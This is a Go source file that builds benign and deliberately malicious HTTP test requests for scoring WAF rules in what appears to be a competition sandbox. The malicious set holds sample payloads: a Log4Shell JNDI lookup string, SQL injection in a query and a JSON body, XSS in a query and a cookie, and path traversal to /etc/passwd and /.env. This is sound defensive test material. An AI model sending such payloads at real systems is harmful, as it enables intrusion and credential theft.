package service

import (
	"os"
	"strconv"
	"strings"

	"github.com/rladnwls122/skills_dashboard-wooj/backend/internal/types"
)

const browserUA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

// The paths the scenario's load generator actually calls — the routes the
// competition binaries register. Overridable because the served paths are part
// of the exercise, not part of this dashboard.
func appTrafficPaths() []string {
	raw := os.Getenv("APP_TRAFFIC_PATHS")
	if strings.TrimSpace(raw) == "" {
		raw = "/v1/user,/v1/product,/v1/stress"
	}
	out := []string{}
	for _, p := range strings.Split(raw, ",") {
		if p = strings.TrimSpace(p); p != "" {
			out = append(out, p)
		}
	}
	return out
}

// DefaultTestRequests is the benign set: the requests the task sheet documents
// for each served path (GET with the grader's requestid/uuid query, POST with
// the JSON body shape the binaries bind), the load generator, and the ALB
// health check. A rule that blocks any of these is a false positive, which is
// what the sandbox is for.
func DefaultTestRequests() []types.TestRequest {
	paths := appTrafficPaths()
	rows := make([]types.TestRequest, 0, 2*len(paths)+2)
	const rid = "requestid=999999999999&uuid=7c5a3c6a-758f-4bc5-9bdf-3e573a0ad729"
	for i, p := range paths {
		id := "app-" + strconv.Itoa(i)
		jsonHeaders := map[string]string{"host": "app.example.com", "content-type": "application/json"}
		switch p {
		case "/v1/user":
			rows = append(rows,
				types.TestRequest{ID: id + "-get", Method: "GET", Path: p, Query: "email=dbdump500001%40example.org&" + rid,
					UserAgent: browserUA, IP: "10.0.2.88", Country: "KR", Benign: true,
					Headers: map[string]string{"host": "app.example.com", "accept": "application/json"}, Labels: []string{}},
				types.TestRequest{ID: id + "-post", Method: "POST", Path: p, UserAgent: browserUA, IP: "10.0.2.88", Country: "KR", Benign: true,
					Headers: jsonHeaders, Labels: []string{},
					Body:    `{"requestid":"999999999999","uuid":"7c5a3c6a-758f-4bc5-9bdf-3e573a0ad729","username":"dbdump500001","email":"dbdump500001@example.org","status_message":"I'm happy"}`})
		case "/v1/product":
			rows = append(rows,
				types.TestRequest{ID: id + "-get", Method: "GET", Path: p, Query: "id=dbdump50001&" + rid,
					UserAgent: browserUA, IP: "10.0.2.88", Country: "KR", Benign: true,
					Headers: map[string]string{"host": "app.example.com", "accept": "application/json"}, Labels: []string{}},
				types.TestRequest{ID: id + "-post", Method: "POST", Path: p, UserAgent: browserUA, IP: "10.0.2.88", Country: "KR", Benign: true,
					Headers: jsonHeaders, Labels: []string{},
					Body:    `{"requestid":"999999999999","uuid":"7c5a3c6a-758f-4bc5-9bdf-3e573a0ad729","id":"dbdump500001","name":"dbdump500001","price":1234}`})
		case "/v1/stress":
			// stress registers POST only — a GET here is a gin 404, not traffic.
			rows = append(rows,
				types.TestRequest{ID: id + "-post", Method: "POST", Path: p, UserAgent: browserUA, IP: "10.0.2.88", Country: "KR", Benign: true,
					Headers: jsonHeaders, Labels: []string{},
					Body:    `{"requestid":"999999999999","uuid":"7c5a3c6a-758f-4bc5-9bdf-3e573a0ad729","length":256}`})
		default:
			rows = append(rows, types.TestRequest{
				ID: id, Method: "GET", Path: p, UserAgent: browserUA, IP: "10.0.2.88", Country: "KR", Benign: true,
				Headers: map[string]string{"host": "app.example.com", "accept": "application/json"}, Labels: []string{},
			})
		}
	}
	first := "/v1/user"
	if len(paths) > 0 {
		first = paths[0]
	}
	rows = append(rows,
		types.TestRequest{
			ID: "loadgen", Method: "GET", Path: first, Query: "email=dbdump500002%40example.org&" + rid, UserAgent: "Go-http-client/2.0",
			IP: "10.0.2.23", Country: "KR", Benign: true,
			Headers: map[string]string{"host": "app.example.com"}, Labels: []string{},
		},
		types.TestRequest{
			ID: "healthcheck", Method: "GET", Path: "/healthcheck", UserAgent: "ELB-HealthChecker/2.0",
			IP: "10.0.2.1", Country: "KR", Benign: true,
			Headers: map[string]string{"host": "app.example.com"}, Labels: []string{},
		},
	)
	return rows
}

// MaliciousExampleRequests is the deliberately malicious set. Blocking any of
// these is the point of a WAF rule — the sandbox scores them as caught, not as a
// false positive. The set exercises every field the evaluator models (path,
// query, header, cookie, user-agent, body).
func MaliciousExampleRequests() []types.TestRequest {
	host := func(extra ...string) map[string]string {
		h := map[string]string{"host": "app.example.com"}
		for i := 0; i+1 < len(extra); i += 2 {
			h[extra[i]] = extra[i+1]
		}
		return h
	}
	mal := func(id, method, path, query, ua, ip, country, body string, headers map[string]string) types.TestRequest {
		return types.TestRequest{
			ID: id, Method: method, Path: path, Query: query, UserAgent: ua,
			IP: ip, Country: country, Benign: false, Headers: headers, Body: body, Labels: []string{},
		}
	}
	return []types.TestRequest{
		mal("mal-wplogin", "GET", "/wp-login.php", "", "Mozilla/5.0", "203.0.113.7", "CN", "", host()),
		mal("mal-sqlmap", "GET", "/v1/user", "id=1%20OR%201=1", "sqlmap/1.7", "203.0.113.8", "RU", "", host()),
		mal("mal-env", "GET", "/.env", "", "python-requests/2.31", "203.0.113.9", "CN", "", host()),
		mal("mal-jndi", "GET", "/v1/user", "", "${jndi:ldap://x/a}", "203.0.113.10", "US", "", host()),
		mal("mal-b64", "GET", "/v1/product", "cmd=Z2V0fHBvc3RfZGF0YV9leGZpbA==", "Mozilla/5.0", "203.0.113.11", "CN", "", host()),
		mal("mal-gobuster", "GET", "/admin", "", "gobuster/3.6", "203.0.113.12", "RU", "", host()),
		mal("mal-xss", "GET", "/v1/product", "q=%3Cscript%3Ealert(1)%3C/script%3E", browserUA, "203.0.113.13", "US", "", host()),
		mal("mal-traversal", "GET", "/v1/user/../../etc/passwd", "", "curl/8.4.0", "203.0.113.14", "CN", "", host()),
		mal("mal-sqli-body", "POST", "/v1/user", "", browserUA, "203.0.113.15", "RU",
			`{"requestid":"1","uuid":"x","username":"a' UNION SELECT password FROM users--","email":"a@b.org","status_message":"x"}`, host("content-type", "application/json")),
		// The product binary's own trap: this User-Agent makes it answer 500
		// ("Consumed resources by malicious attacks") — the task's abnormal
		// request, which the WAF has to turn into a 403 first.
		mal("mal-attacker-bot", "POST", "/v1/product", "", "Attacker-Bot", "203.0.113.17", "KR",
			`{"requestid":"1","uuid":"x","id":"dbdump500001","name":"dbdump500001","price":1234}`, host("content-type", "application/json")),
		// Email Request Validation: the task wants POST /v1/user with an email
		// that is not xxxx@xxxx.xxxx answered 403, and says the app does not
		// check it — so the WAF must.
		mal("mal-email-nodomain", "POST", "/v1/user", "", browserUA, "203.0.113.18", "KR",
			`{"requestid":"1","uuid":"x","username":"gildong","email":"gildong","status_message":"x"}`, host("content-type", "application/json")),
		mal("mal-email-notld", "POST", "/v1/user", "", browserUA, "203.0.113.19", "KR",
			`{"requestid":"1","uuid":"x","username":"gildong","email":"gildong@example","status_message":"x"}`, host("content-type", "application/json")),
		mal("mal-cookie", "GET", "/v1/user", "", browserUA, "203.0.113.16", "CN", "",
			host("cookie", "session=abc; tracker=<script>x</script>")),
	}
}
